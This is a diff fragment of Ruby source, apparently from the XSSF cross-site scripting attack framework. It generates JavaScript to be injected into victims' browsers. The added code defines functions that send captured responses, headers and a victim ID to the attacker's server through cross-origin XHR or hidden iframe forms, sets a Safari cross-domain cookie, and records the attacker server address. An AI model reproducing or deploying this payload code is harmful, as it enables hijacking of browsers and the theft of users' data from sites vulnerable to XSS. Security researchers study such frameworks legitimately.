-						string += "<input name='#{PARAM_RESPONSE}' 	value='"+escape(response)+"'	type='hidden'>"; 
-						string += "<input name='#{PARAM_CTYPE}' 	value='"+tunnel_ctype+"' 		type='hidden'>"; 
-						string += "<input name='#{PARAM_TYPE}' 		value='"+response_type+"' 		type='hidden'>"; 
-						string += "<input name='#{PARAM_ID}' 		value='#{id}' 					type='hidden'>";
-						string += "</form>";
-						
-						doc.open(); doc.write(string); doc.close(); doc.forms[0].submit();
+					
+					function XSSF_POST_B64(response, mod_name) {
+						XSSF_POST("__________" + response + "__________", mod_name);
 					}
 				}
-			end
-			
-			#
-			# Reads a file and return data
-			#
-			def read_file(name)
-				data = ""
-				file = File.open(name, "r")
-				file.each_line do |l|;	data << l;	end
-				file.close;
 				
-				return data
+				# If Cross-Domain request (Cross-Origin Resource Sharing) can be used, then we use it in order to POST results
+				if 	( 	((info[0] =~ /Internet Explorer/i) and (info[1] >= 8.0)) or
+						((info[0] =~ /Firefox/i) and (info[1] >= 3.5))
+					)
+					code << %Q{
+						function XSSF_POST(response, mod_name, headers, resp_id) {
+							x = XSSF_CREATE_XHR();
+							headers = headers || "";		mod_name = mod_name || "Unknown";		resp_id	= resp_id || Math.floor(Math.random()*10000000);
+								
+							x.open("POST", "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ANSWER}");
+							x.send("#{PARAM_NAME}=" + escape(mod_name) + "&#{PARAM_RESPONSE}=" + escape(response) + "&#{PARAM_HEADERS}=" + escape(headers) + "&#{PARAM_RESPID}=" + escape(resp_id) + "&#{PARAM_ID}=#{id}");
+						}
+					}
+				else
+					code << %Q{
+						function XSSF_POST(response, mod_name, headers, resp_id) {
+							headers = headers || "";		mod_name = mod_name || "Unknown";		resp_id	= resp_id || Math.floor(Math.random()*10000000);
+							
+							i = XSSF_CREATE_IFRAME(resp_id, 0, 0);	i.name = "POST_IFRAME";		document.body.appendChild(i);
+
+							clearInterval(XSSF_DO_GARBAGE);		XSSF_DO_GARBAGE = setInterval(XSSF_GARBAGE, #{TUNNEL_TIMEOUT} * 1000);
+							
+							var d = null;
+							if(i.contentDocument)		d = i.contentDocument;
+							else if(i.contentWindow)   	d = i.contentWindow.document;
+							else if(i.document)			d = i.document;
+							else						return;
+
+							string  = "<form name='XSSF_FORM' id='XSSF_FORM' method='POST' enctype='multipart/form-data' action='http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ANSWER}' >";
+							string += "<input name='#{PARAM_NAME}' 		value='"+escape(mod_name)+"'	type='hidden'>";
+							string += "<input name='#{PARAM_RESPONSE}' 	value='"+escape(response)+"'	type='hidden'>"; 
+							string += "<input name='#{PARAM_HEADERS}' 	value='"+escape(headers)+"' 	type='hidden'>";
+							string += "<input name='#{PARAM_RESPID}' 	value='"+escape(resp_id)+"' 	type='hidden'>"; 
+							string += "<input name='#{PARAM_ID}' 		value='#{id}'					type='hidden'></form>";
+							
+							d.open(); d.write(string); d.close(); d.forms[0].submit();
+						}
+					}
+				end
+				
+				# Safari browser need a POST request inside iframe to set cross-domain cookie
+				if ((info[0] =~ /SAFARI/i) and (not info[2] =~ /ANDROID/i)) 
+					code << %Q{	
+						i = XSSF_CREATE_IFRAME("SAFARI_COOKIE", 0, 0);	i.name = "POST_IFRAME";		document.body.appendChild(i);
+							
+						var d = null;
+						if(i.contentDocument)		d = i.contentDocument;
+						else if(i.contentWindow)   	d = i.contentWindow.document;
+						else if(i.document)			d = i.document;
+						else						d = null;
+
+						string  = "<form name='XSSF_FORM' id='XSSF_FORM' method='POST' enctype='multipart/form-data' action='http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_SAFARI}'>";
+						string += "<input name='#{PARAM_ID}' 	value='#{id}'	type='hidden'></form>";
+
+						if (d != null) { d.open(); d.write(string); d.close(); d.forms[0].submit(); }
+					}
+				end
+				
+				code << %Q{
+					XSSF_SERVER = "http://#{host}:#{self.serverPort}#{self.serverURI}";
+					XSSF_VICTIM_ID 	= #{id.to_s};
+					XSSF_XHR 		= XSSF_CREATE_XHR();
+				}
+
+				return code
 			end
 		end
 	end
